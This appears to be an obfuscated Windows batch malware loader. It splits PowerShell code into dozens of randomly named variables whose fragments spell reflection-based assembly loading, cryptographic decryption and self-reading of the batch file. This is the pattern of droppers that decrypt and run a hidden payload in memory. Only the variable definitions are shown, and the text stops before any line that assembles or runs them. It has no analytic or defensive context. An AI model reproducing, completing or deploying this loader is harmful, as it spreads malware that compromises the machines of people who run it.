@echo off
set "RtLZWDcLbB== [S"
set "uFSMCbZulJ=iron"
set "SavoUAOtgy=oint"
set "jmnHBggmdX= [st"
set "vTpWVeNCPs=);$W"
set "dlJggEmYeJ=F'[-"
set "JpRALFaIHD=th('"
set "jhTQhIBppa=dj0C"
set "ooPuXGwcUN=D.Su"
set "AuGHaQXQPL=$cEi"
set "jVWdXJmsiz=embl"
set "EPhvpmdiDH=flec"
set "eCnzXGiTgA=Comp"
set "FtfjgdCaLL=trea"
set "VOnxevfgKH=)) {"
set "gxMOEyhpdk=rity"
set "kjhAcvPqgY=Bmor"
set "lMIqbYbSku=l.Pa"
set "ujjjUvfWfi=e = "
set "smXsUEFvaN=]::("
set "VGfSBhBzzp=('%~f0'"
set "AttlTLSijk=tsWi"
set "feUQfPtmjy=lBlo"
set "JigfOEFemR=..-1"
set "lpmuKbPPBY=.Mod"
set "voerWkvtvv=oPdO"
set "sIJwxOxldF=yTo("
set "zQVmkKXPAW=.Dis"
set "qOEZezSDLq=O.Me"
set "jvYlMzLVQl=CFxo"
set "MMNrJiRMiZ=-1.."
set "PtNZdMPEyR=();$"
set "RJzbZSIYjJ=ke($"
set "BLWyjCTmCb=PxEW"
set "rrfpaXtsIV=.Key"
set "HsIImlfloi=Rorl"
set "wZMgPwZSLZ=vvnR"
set "MEIoWGaesN=.Ass"
set "wMwEBLEVqy=l5E7"
set "IjmlmJDMrj==');"
set "TDNVfWUliH=y]::"
set "sjTyHWtFVM=:: '"
set "NjpdKhqzpo=.Dis"
set "ddrLlbezMq=;$vA"
set "ZHgOOjIuDP=IpxU"
set "lYpbwZUMxz=ct S"
set "hcAUAHnYLn=oryS"
set "AJgEiPCCvy= '')"
set "aIXKCOASxt=oin "
set "aPlPSPmlgE=[IO."
set "yuNyLWMrDU=yste"
set "mRGJJgdMqU=eam("
set "ExdVHiQJLS=ode]"
set "bayegMNQxJ=XoPd"
